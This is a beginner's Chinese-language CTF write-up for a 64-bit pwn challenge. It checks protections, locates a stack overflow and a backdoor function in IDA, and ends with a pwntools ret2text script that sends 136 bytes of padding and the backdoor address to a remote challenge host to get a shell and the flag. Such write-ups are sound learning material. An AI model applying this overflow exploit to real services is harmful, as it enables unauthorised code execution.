**新手上路，欢迎交流指导**

老规矩，checksec

<img width="502" height="179" alt="image" src="https://github.com/user-attachments/assets/6dfd39f4-84ae-44ce-9410-536bda8fd12d" />

开了栈堆不可执行，64位

看IDA

<img width="806" height="185" alt="image" src="https://github.com/user-attachments/assets/b21cf062-ff2f-4172-8a3f-d89d46b19d16" />

没什么东西，点进去那个可疑的函数vulnerable_function(1)

<img width="530" height="171" alt="image" src="https://github.com/user-attachments/assets/7d1ab813-9295-4057-b17f-211447c9f2d9" />

发现0x200u比0x80，优势在我，直接栈溢出，paylaod构造时是0x80+8

又发现惊喜后门函数callsystem，text代码段（可执行）

<img width="510" height="473" alt="image" src="https://github.com/user-attachments/assets/d16efda9-f4aa-44eb-b89c-6b28a724da36" />

callsystem按F5反汇编

<img width="309" height="95" alt="image" src="https://github.com/user-attachments/assets/9d9533c4-51e5-47f4-b6db-7317d8eb684e" />


**段权限速查表**
| 段名 | 读 | 写 | 执行 | Pwn用途 |
| :--- | :---: | :---: | :---: | :--- |
| **.text** | ✓ | ✗ | ✓ | 代码/gadget |
| **.plt** | ✓ |  | ✓ | ROP调用 |
| **.rodata** | ✓ | ✗ |  | 字符串常量 |
| **.data** | ✓ | ✓ | ✗ | 可写数据 |
| **.bss** | ✓ | ✓ | ✗ | 未初始化数据 |
| **.got** | ✓ | ✓ |  | GOT攻击 |
| **.got.plt** | ✓ | ✓ | ✗ | PLT GOT攻击 |

以下是脚本：

```python
from pwn import *
r=remote("node5.buuoj.cn",26592)

addr=0x400596

payload=b"A"*136+p64(addr)

r.sendline(payload)

r.interactive()
```

拿到flag
<img width="1106" height="272" alt="image" src="https://github.com/user-attachments/assets/08a763c3-c62b-4b98-b9c1-f7262fa9fbac" />
